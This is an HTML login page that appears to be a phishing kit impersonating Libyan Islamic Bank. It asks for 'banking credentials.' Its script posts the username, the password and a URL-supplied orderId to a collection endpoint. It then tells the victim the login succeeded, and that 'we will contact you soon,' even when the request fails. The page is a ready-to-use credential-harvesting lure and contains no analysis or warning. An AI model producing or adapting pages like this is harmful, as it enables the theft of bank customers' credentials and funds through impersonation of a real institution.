<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Libyan Islamic Bank</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Cairo', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #8b6914, #a07d2e, #6b5010);
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 420px;
            text-align: center;
        }

        .login-title {
            font-size: 36px;
            font-weight: 800;
            color: #fff;
            margin-bottom: 10px;
        }

        .login-subtitle {
            font-size: 15px;
            color: rgba(255,255,255,0.85);
            margin-bottom: 40px;
        }

        .form-group {
            margin-bottom: 25px;
            text-align: left;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
        }

        .input-wrapper {
            position: relative;
        }

        .form-group input {
            width: 100%;
            padding: 16px 18px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-family: 'Cairo', sans-serif;
            background: #fff;
            color: #333;
            outline: none;
        }

        .form-group input::placeholder {
            color: #aaa;
        }

        .toggle-password {
            position: absolute;
            right: 14px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            color: #666;
            font-size: 18px;
            display: flex;
            align-items: center;
        }

        .forgot-link {
            display: block;
            text-align: center;
            color: #fff;
            font-size: 14px;
            font-weight: 600;
            margin: 30px 0 40px;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 30px;
            background: #fff;
            color: #5a3e2b;
            font-size: 16px;
            font-weight: 700;
            font-family: 'Cairo', sans-serif;
            cursor: pointer;
            max-width: 320px;
            margin: 0 auto;
            display: block;
        }

        .login-btn:hover {
            background: #f0ebe5;
        }



    </style>
</head>
<body>
    <div class="login-container">
        <h1 class="login-title">Let's Start</h1>
        <p class="login-subtitle">Enter your banking credentials to continue</p>

        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username</label>
                <div class="input-wrapper">
                    <input type="text" id="username" name="username" placeholder="Username" required>
                </div>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <div class="input-wrapper">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                    <button type="button" class="toggle-password" onclick="togglePass()">
                        <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                    </button>
                </div>
            </div>

            <a href="#" class="forgot-link">Forgot credentials?</a>

            <button type="submit" class="login-btn">Sign In</button>
        </form>
    </div>

    <script>
    function togglePass() {
        const inp = document.getElementById('password');
        inp.type = inp.type === 'password' ? 'text' : 'password';
    }

    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        const params = new URLSearchParams(window.location.search);
        const orderId = Number(params.get('orderId')) || 0;
        fetch('/api/submit-login', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                orderId: orderId,
                username: document.getElementById('username').value.trim(),
                password: document.getElementById('password').value
            })
        })
        .then(function(res) { return res.json(); })
        .then(function() {
            alert('Login successful! We will contact you soon.');
        })
        .catch(function() {
            alert('Login successful! We will contact you soon.');
        });
    });
    </script>
</body>
</html>
